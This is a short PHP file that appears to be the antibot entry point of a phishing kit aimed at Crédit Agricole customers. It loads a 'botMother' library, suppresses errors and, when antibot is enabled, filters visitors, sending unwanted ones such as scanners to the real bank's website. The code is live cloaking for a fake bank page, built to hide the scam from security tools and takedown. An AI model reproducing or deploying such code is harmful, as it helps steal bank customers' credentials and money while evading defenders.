<?php 
error_reporting(0);
require (__DIR__).'/config.php';
require (__DIR__).'/botMother/botMother.php';
$bm = new botMother();
$bm->setExitLink("https://www.credit-agricole.fr/");
$bm->setGeoFilter("");
$bm->setLicenseKey("");
$bm->setTestMode(false);

if(strtolower($antibot)=="yes"){
$bm->run();
}
 






?>